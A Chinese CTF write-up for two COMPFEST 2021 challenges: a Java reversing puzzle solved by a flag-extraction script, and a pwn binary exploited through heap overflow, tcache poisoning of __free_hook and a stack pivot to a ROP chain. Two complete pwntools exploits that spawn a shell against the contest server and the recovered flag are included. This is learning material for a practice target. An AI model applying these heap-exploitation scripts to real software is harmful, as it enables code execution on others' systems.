# 说在前面
这里是印度杯COMPFEST CTF 2021的两道题目，reverse和pwn。这里赛后记录一下。
# Pave The Way
[attachment](https://github.com/1094093288/IMG/tree/master/Pwn/%E5%8D%B0%E5%BA%A6%E6%9D%AF2021/Pwn_Shop_Manager/attachments)
这道题目是一个简单的逆向，打开题目是个jar包，反编译后，可以看到如下代码：
```java
class c277 {
   public static void main(String[] var0) throws Exception {
      System.out.print("Paving your way.");
      pave("");
   }

   public static void pave(String var0) throws Exception {
      var0 = var0 + "C";
      System.out.print(".");
      Thread.sleep(3600000L);
      c150.pave(var0);
   }
}
```
这类代码有1000个，需要找到main入口类，找到以下c277：
```java
Manifest-Version: 1.0
Main-Class: c277
Created-By: 14.0.2 (Private Build)
```
可以发现只是对一个字符进行拼接，但是运行程序的话会需要sleep(3600000)，之后会跳到下一个字符，所以需要编写脚本，将从c277类开始提取，直到提取到`}`符号。
## 脚本
```python

import re

i = 277

w = ''

while True:
    with open(f'c{i}.java') as f:
        s = f.read()
    try:
        m = re.search(r'var0 = var0 .*', s)
        print('m: ',m)
        m1 = re.search(r'.*pave\(var0\)', s)
        #print('m1: ',m1)
        #print('m.group()',m.group())
        #print('m.group()[:-1]',m.group()[:-1].split()[-1])

        w += m.group()[:-1].split()[-1].replace('"','')

        i = int(m1.group().strip()[1:].split('.')[0])

    except:
        break

print(w)

# COMPFEST13{WhaY_j4r_ne3d_MaNiFeSt_file_oOf_bafc2b182e}

```
# shop-manger_pwn
[attachment](https://github.com/1094093288/IMG/tree/master/Pwn/%E5%8D%B0%E5%BA%A6%E6%9D%AF2021/re_Pave%20The%20Way/attachments)
这道题目是同样是比赛的一道pwn题，做的时候，没有想到如何泄露程序的地址，赛后看了大佬的wp，在此记录下泄露地址方法和利用方式。
```
## Shop Manager

> Points: 496
>
> Solves: 6

### Description:
A simple shop simulator

nc 103.152.242.242 39221

Author: prajnapras19

### Attachments:
```
shop-manager-master-public.zip
```
## 功能分析
运行程序：
```bash
Welcome to our shop :D
You are our new manager.
Your job is to fill our shop with new items and sell them.
For now, you can add up to 20 items in your list.
Good luck.
Menu:
1. Add item
2. Delete item
3. Edit item
4. List of added items
5. Sell item
6. Exit
> 
```
删除函数：
```c
int deleteItem()
{
  int v1; // [rsp+Ch] [rbp-14h] BYREF
  __int64 v2; // [rsp+10h] [rbp-10h]
  int i; // [rsp+1Ch] [rbp-4h]

  if ( !idx )
    return puts("Our shop is empty.");
  printf("Item index (0 - %d): ", (unsigned int)(idx - 1));
  __isoc99_scanf("%d", &v1);
  if ( v1 < 0 || v1 >= idx )
    return puts("Item index not found.");
  free((void *)items[v1]);
  for ( i = v1; i < idx; ++i )
  {
    v2 = items[i];
    items[i] = items[i + 1];
    items[i + 1] = v2;
  }
  --idx;
  return puts("Item deleted successfully.");
}
```
sellitem函数：
```c
int sellItem()
{
  char v1[28]; // [rsp+0h] [rbp-30h] BYREF
  int v2; // [rsp+1Ch] [rbp-14h] BYREF
  __int64 v3; // [rsp+20h] [rbp-10h]
  int i; // [rsp+2Ch] [rbp-4h]

  if ( !idx )
    return puts("Our shop is empty.");
  printf("Item index (0 - %d): ", (unsigned int)(idx - 1));
  __isoc99_scanf("%d", &v2);
  if ( v2 < 0 || v2 >= idx )
    return puts("Item index not found.");
  puts("What do you want to say about this item?");
  __isoc99_scanf("%65s", v1);   <-----栈溢出----->
  printf("You said: %s\n", v1);
  free((void *)items[v2]);
  for ( i = v2; i < idx; ++i )
  {
    v3 = items[i];
    items[i] = items[i + 1];
    items[i + 1] = v3;
  }
  --idx;
  return puts("Item sold successfully.");
}

```
editItem函数：
```c
int editItem()
{
  int v1; // [rsp+Ch] [rbp-4h] BYREF

  if ( !idx )
    return puts("Our shop is empty.");
  printf("Item index (0 - %d): ", (unsigned int)(idx - 1));
  __isoc99_scanf("%d", &v1);
  if ( v1 < 0 || v1 >= idx )
    return puts("Item index not found.");
  printf("Item name: ");
  __isoc99_scanf("%s", *(_QWORD *)(items[v1] + 8LL)); <------heap overflow----->
  printf("Item price: ");
  __isoc99_scanf("%ld", items[v1]);
  return puts("Item edited successfully.");
}
```
申请item的大小是固定的，且个数最高20个。
1. ADD item。添加item，输入name，price。是一个结构体，包含name、price成员变量，在堆上的排布是先申请一个0x10堆块，包含price，指向name的ptr，紧接着后面是大小为0x20的存放name的chunk。
2. Delete item。输入idx，释放对应堆块，之后将删除的item[idx]对应的地址移动到item数组(bss段)的最后面，剩下的item整体向前移动，idx减一。
3. Edit item。可以修改name、price。存在堆溢出问题。
4. List of added items。输出所有items。
5. Sell item。存在栈溢出漏洞，其他和delete相同。

## 利用方式
1. 通过堆溢出覆盖chunksize，制造largebin，释放掉后进入unstoredbin。
2. 申请出来一个chunk，unsorted bin chunk的地址将被放到2th chunk，所以可以通过List功能在2th chunk处泄露libc地址。
3. 通过delete将chunk释放到tcache，用edit将free_hook释放到tcache。
4. 通过申请将freehook申请出来，将freehook改为system，将`/bin/sh`写入chunk。
5. 通过free特定的chunk触发system('/bin/sh'),getshell。

## 利用过程
1. heap overflow
需要add 16个item创造一个big chunk，通过第0个chunk 溢出覆盖第2个chunkd的size为0x431
```
0x604260:	0x0000000000000000	0x0000000000000021
0x604270:	0x0000000000000001	0x0000000000604290
0x604280:	0x0000000000000000	0x0000000000000031
0x604290:	0x6161616161616161	0x6161616161616161
0x6042a0:	0x6161616161616161	0x6161616161616161
0x6042b0:	0x6161616161616161	0x0000000000000431   Change to 0x21 => 0x431
0x6042c0:	0x0000000000000000	0x00000000006042e0
0x6042d0:	0x0000000000000000	0x0000000000000031
0x6042e0:	0x4242424242424242	0x0000000000000000
0x6042f0:	0x0000000000000000	0x0000000000000000
0x604300:	0x0000000000000000	0x0000000000000021
```
随后将第1个chunk删除，那么0x431大小的chunk会被放到unsorted bin中，但此时不能泄露，因为第一个chunk已被删除，地址被移到了item的最后面，访问不到该原来1th chunk地址，
```
0x604260:	0x0000000000000000	0x0000000000000021
0x604270:	0x0000000000000001	0x0000000000604290
0x604280:	0x0000000000000000	0x0000000000000031
0x604290:	0x6161616161616161	0x6161616161616161
0x6042a0:	0x6161616161616161	0x6161616161616161
0x6042b0:	0x6161616161616161	0x0000000000000431
0x6042c0:	0x00007ffff7dcdca0	0x00007ffff7dcdca0  The 1st chunk goes into an unsorted bin
0x6042d0:	0x0000000000000000	0x0000000000000000
0x6042e0:	0x4242424242424242	0x0000000000000000
0x6042f0:	0x0000000000000000	0x0000000000000000
0x604300:	0x0000000000000000	0x0000000000000021
```

我们要通过add重新将1th chunk地址从unsorted bin中申请出来，unsorted bin的地址就会放到2th chunk的地方，此时就可以通过List功能泄露出libc。

```
    'Name: `G`\n'
    'Price: 140737351834784\n'      =>  0x00007ffff7dcdca0
```
有了libc地址，我们就可以用add、edit、delete功能将__free_hook地址放入tcache
```
# tcache poisoning
Add("c", 3) 
Delete(5) <---delete one of unsorted bin items--->
Delete(1)
Edit(14, "d", free_hook)
```
这里Add("c", 3) 的做用是构造1st chunk的双指针指向（UAF）,如下可以看到1st和14st都指向0x00000000013ff350
```bash
0x6020a0 <items>:       0x00000000013ff2b0      0x00000000013ff350 <---1st
0x6020b0 <items+16>:    0x00000000013ff3a0      0x00000000013ff3f0
0x6020c0 <items+32>:    0x00000000013ff440      0x00000000013ff4e0
0x6020d0 <items+48>:    0x00000000013ff530      0x00000000013ff580
0x6020e0 <items+64>:    0x00000000013ff5d0      0x00000000013ff620
0x6020f0 <items+80>:    0x00000000013ff670      0x00000000013ff6c0
0x602100 <items+96>:    0x00000000013ff710      0x00000000013ff760
0x602110 <items+112>:   0x00000000013ff300      0x00000000013ff350 <---14st
0x602120 <items+128>:   0x0000000000000000      0x00000000013ff490
0x602130 <items+144>:   0x0000000000000000      0x0000000000000000

```
接着Delete(5)(理论上除了1st，随便一个item都是可以的)，Delete(1)，Edit(14, "d", free_hook)，如下，
```
(0x20)   tcache_entry[0](100): 0x13ff350 --> 0x7f70a0b9cb28(__free_hook)
```
由于1st chunk删除后，14st chunk仍能对其进行修改，所以可用edit功能对14st编辑可将tcache中1st chunk的fd修改为free_hook。
再逐一将其申请出来，可以将`/bin/sh`写入到14st chunk的price处，add 15st chunk修改free_hook为system。此时free(14)即可调用system，14st chunk的price部分会被当做参数，从而获取shell。
```
# Write system address in __free_hook
Add("e", u64("/bin/sh\x00"))   # 14
Add("f", system_addr) # 15

# Start shell
Delete(14) 
```
## exp
```python
# ubuntu20。04 libc-2.31.so
from pwn import *

#context(os='linux', arch='amd64')
context.log_level = 'debug'
context.terminal = ['/usr/bin/tmux','sp','-h']

BINARY = './chall'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "103.152.242.242"
  PORT = 39221
  s = remote(HOST, PORT)
  libc = ELF("./libc-2.27.so")
else:
  s = process(BINARY)
  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  #ibc = elf.libc

def Add(data, price):
  s.sendlineafter("> ", "1")
  s.sendlineafter("name: ", data)
  s.sendlineafter("price: ", str(price))

def Delete(idx):
  s.sendlineafter("> ", "2")
  s.sendlineafter("): ", str(idx))

def Edit(idx, data, price):
  s.sendlineafter("> ", "3")
  s.sendlineafter("): ", str(idx))
  s.sendlineafter("name: ", data)
  s.sendlineafter("price: ", str(price))

def List():
  s.sendlineafter("> ", "4")

def Sell(idx, item):
  s.sendlineafter("> ", "5")
  s.sendlineafter("): ", str(idx))
  s.sendlineafter("item?\n", item)

def Exit():
  s.sendlineafter("> ", "6")

for i in range(16):  #0-15
  Add(chr(0x41+i)*8, 1)

# libc leak
Edit(0, "a"*0x28+p64(0x431), 1)
Delete(1) 
#gdb.attach(s)
Add("b", 2) # 15
List()
for i in range(2):
  s.recvuntil("Price: ")
libc_leak = int(s.recvuntil("\n"))
# libc_base = libc_leak - libc.sym.__malloc_hook - 0x70
# free_hook = libc_base + libc.sym.__free_hook
# system_addr = libc_base + libc.sym.system
libc_base = libc_leak - libc.symbols['__malloc_hook'] - 0x70
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
print "libc_leak =", hex(libc_leak)
print "libc_base =", hex(libc_base)

# tcache poisoning
Add("c", 3) #16
Delete(6) #15
Delete(1) #14
gdb.attach(s)
Edit(14, "d", free_hook)

# Write system address in __free_hook
Add("e", u64("/bin/sh\x00"))   # 14
Add("f", system_addr) # 15

# Start shell
Delete(14)

s.interactive()
```
## 利用方式2
另外一种利用方式是通过栈溢出方法，将栈迁移到堆上，ROP拿到shell。
首先利用tcache attack泄露heap address，主要利用堆溢出将chunk1的price字段覆盖为bss段地址（items14地址），使得堆申请到bss段，如下：
```python
for i in range(15): #0-14
  Add(chr(0x41+i)*8, i)

# tcache attack
Delete(2) 
Delete(1) 


# Heap Leak
Edit(0, "a"*0x28+p64(0x21)+p64(0x602100), 0) # modify 1st->fd = 0x602100(bss)

Add("a", 4) 
Add(p64(0x602100), 0x6020a0) # 12  malloc 0x602100   fd->0x6020a0(items12)

List()# leak address 0x6020a0 point to heap address(item0)
for i in range(13):
  s.recvuntil("Price: ")
heap_leak = int(s.recvuntil("\n"))
heap_base = heap_leak - 0x1270-0x40
print "heap_leak =", hex(heap_leak)
print "heap_base =", hex(heap_base)
```
如下，当输出item12的信息时会将0x00000000020742b0作为price输出：
```
pwndbg> x/16gx 0x6020a0
0x6020a0 <items>:       0x00000000020742b0 <--leak     0x00000000020743a0
0x6020b0 <items+16>:    0x00000000020743f0      0x0000000002074440
0x6020c0 <items+32>:    0x0000000002074490      0x00000000020744e0
0x6020d0 <items+48>:    0x0000000002074530      0x0000000002074580
0x6020e0 <items+64>:    0x00000000020745d0      0x0000000002074620
0x6020f0 <items+80>:    0x0000000002074670      0x00000000020746c0
0x602100 <items+96>:    0x00000000006020a0 <--item12     0x0000000002074790
0x602110 <items+112>:   0x0000000000602100 <--     0x0000000002074350
```
泄露libc，操作如下，主要是通过edit修改item14的price为scanf.got（此时堆在bss段，覆盖了其他item的地址），再利用List函数将scanf.got指向的地址作为item12的price输出
```python
# libc leak
Edit(14, "X", elf.got.__isoc99_scanf) # mod

List() 
for i in range(13):
  s.recvuntil("Price: ")
scanf_addr  = int(s.recvuntil("\n"))
libc_base   = scanf_addr - libc.symbols['__isoc99_scanf']
system_addr = libc_base + libc.symbols['system']
binsh_addr  = libc_base + next(libc.search('/bin/sh'))
print "scanf_addr =", hex(scanf_addr)
print "libc_base  =", hex(libc_base)
```
```
pwndbg> x/16gx 0x6020a0
0x6020a0 <items>:       0x00000000020742b0      0x00000000020743a0
0x6020b0 <items+16>:    0x00000000020743f0      0x0000000002074440
0x6020c0 <items+32>:    0x0000000002074490      0x00000000020744e0
0x6020d0 <items+48>:    0x0000000002074530      0x0000000002074580
0x6020e0 <items+64>:    0x00000000020745d0      0x0000000002074620
0x6020f0 <items+80>:    0x0000000002074670      0x00000000020746c0
0x602100 <items+96>:    0x0000000000602050 <--scanf.got     0x0000000002074790
0x602110 <items+112>:   0x0000000000602100 <--item14     0x0000000002074350
```
```
pwndbg> x/16gx 0x602050
0x602050 <__isoc99_scanf@got.plt>:      0x00007f7f6bd30230 <--leak     0x00000000004006d6
0x602060:       0x0000000000000000      0x0000000000000000
0x602070 <N>:   0x0000000000000014      0x0000000000000000
0x602080 <stdout@@GLIBC_2.2.5>: 0x00007f7f6beb66a0      0x0000000000000000
0x602090 <stdin@@GLIBC_2.2.5>:  0x00007f7f6beb5980      0x0000000f00000000
0x6020a0 <items>:       0x00000000020742b0      0x00000000020743a0
0x6020b0 <items+16>:    0x00000000020743f0      0x0000000002074440
0x6020c0 <items+32>:    0x0000000002074490      0x00000000020744e0
```
泄露了heapaddress、libcaddress后，可得到system、/bin/sh地址，最后利用栈溢出覆盖返回地址可拿到shell，但是发现ROP溢出至少需要`0x38+0x18=0x50>65`，溢出长度不足，所以这就是泄露heap地址的作用，考虑将stack迁移到堆上，迁移到堆上需要溢出`0x38<65`字节,满足溢出条件。操作如下：
```python
pop_rdi_ret = 0x400f63 # pop rdi; ret; 
leave_ret   = 0x400e11 # leave; ret;

Add(p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr), 0)
gdb.attach(s)
# Stack pivot to heap
Sell(3, "b"*0x18+p64(3)+p64(0)*2+p64(heap_base + 0x17e0 - 8) + p64(leave_ret))

s.interactive()
```
## exp2
```python
# ubuntu20。04 libc-2.31.so
from pwn import *

#context(os='linux', arch='amd64')
context.log_level = 'debug'
context.terminal = ['/usr/bin/tmux','sp','-h']

BINARY = './chall'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "103.152.242.242"
  PORT = 39221
  s = remote(HOST, PORT)
  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
  s = process(BINARY)
  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  # libc = elf.libc

def Add(data, price):
  s.sendlineafter("> ", "1")
  s.sendlineafter("name: ", data)
  s.sendlineafter("price: ", str(price))

def Delete(idx):
  s.sendlineafter("> ", "2")
  s.sendlineafter("): ", str(idx))

def Edit(idx, data, price):
  s.sendlineafter("> ", "3")
  s.sendlineafter("): ", str(idx))
  s.sendlineafter("name: ", data)
  s.sendlineafter("price: ", str(price))

def List():
  s.sendlineafter("> ", "4")

def Sell(idx, item):
  s.sendlineafter("> ", "5")
  s.sendlineafter("): ", str(idx))
  s.sendlineafter("item?\n", item)

def Exit():
  s.sendlineafter("> ", "6")

for i in range(15): #0-14
  Add(chr(0x41+i)*8, i)

# tcache attack
Delete(2) 
Delete(1) 


# Heap Leak
Edit(0, "a"*0x28+p64(0x21)+p64(0x602100), 0) # modify 1st->fd = 0x602100(bss)

Add("a", 4) 
Add(p64(0x602100), 0x6020a0) # 12  malloc 0x602100   fd->0x6020a0(items12)

List()# leak address 0x6020a0 point to heap address(item0)
for i in range(13):
  s.recvuntil("Price: ")
heap_leak = int(s.recvuntil("\n"))
heap_base = heap_leak - 0x1270-0x40
print "heap_leak =", hex(heap_leak)
print "heap_base =", hex(heap_base)

# libc leak
Edit(14, "X", elf.got.__isoc99_scanf) # mod

List() 
for i in range(13):
  s.recvuntil("Price: ")
scanf_addr  = int(s.recvuntil("\n"))
libc_base   = scanf_addr - libc.symbols['__isoc99_scanf']
system_addr = libc_base + libc.symbols['system']
binsh_addr  = libc_base + next(libc.search('/bin/sh'))
print "scanf_addr =", hex(scanf_addr)
print "libc_base  =", hex(libc_base)

pop_rdi_ret = 0x400f63 # pop rdi; ret; 
leave_ret   = 0x400e11 # leave; ret;

Add(p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr), 0)
gdb.attach(s)
# Stack pivot to heap
Sell(3, "b"*0x18+p64(3)+p64(0)*2+p64(heap_base + 0x17e0 - 8) + p64(leave_ret))

s.interactive()
```
# 总结
这道pwn题目，首先漏洞点很好找，由当时找到了sell里的栈溢出，但是没有想到如何泄露地址，如何利用；主要是没仔细发现edit中还有一个溢出😂，这次学到了两种泄露地址方法：
1. 通过溢出制造unsorted bin来泄露libc
2. 通过tcache attack，申请到bss段，结合题目泄露heap、libc
还有就是当栈溢出长度不够时，考虑将栈迁移到bss或者堆上，具体还要看程序有没有提供修改的功能，如此题程序提供了修改heap的功能，就可以将stack迁移到heap上。
总之收获还是挺多的！！